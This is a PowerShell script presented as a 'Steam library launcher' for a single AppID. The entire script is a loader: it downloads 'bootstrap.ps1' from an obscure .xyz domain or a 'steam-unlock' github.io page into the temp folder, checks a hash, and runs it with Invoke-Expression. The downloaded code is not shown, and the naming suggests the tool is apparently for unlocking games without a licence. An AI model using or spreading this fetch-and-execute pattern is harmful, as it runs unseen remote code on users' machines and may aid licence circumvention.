# Steam library launcher (AppID 374320)
# Review bootstrap.ps1 before running this file.
$env:OST_APPID = '374320'
$env:OST_YES   = '1'
$srcs = @('https://jiangqr2026.xyz/bootstrap.ps1', 'https://jiangqr2024.github.io/steam-unlock/bootstrap.ps1')
$bootFile = Join-Path $env:TEMP 'ost-bootstrap.ps1'
$ready = $false
foreach ($src in $srcs) {
    try {
        Invoke-WebRequest -Uri $src -OutFile $bootFile -TimeoutSec 12 -UseBasicParsing -ErrorAction Stop | Out-Null
        if ((Get-FileHash -LiteralPath $bootFile -Algorithm SHA256).Hash -eq '105BBE00FF2426FB9FF637CDC75247333341ED4D4DBB8EF1484D11BAD356361B') { $ready = $true; break }
    } catch { }
}
if (-not $ready) { throw 'Verified bootstrap unavailable. Use the offline package.' }
iex (Get-Content -LiteralPath $bootFile -Raw)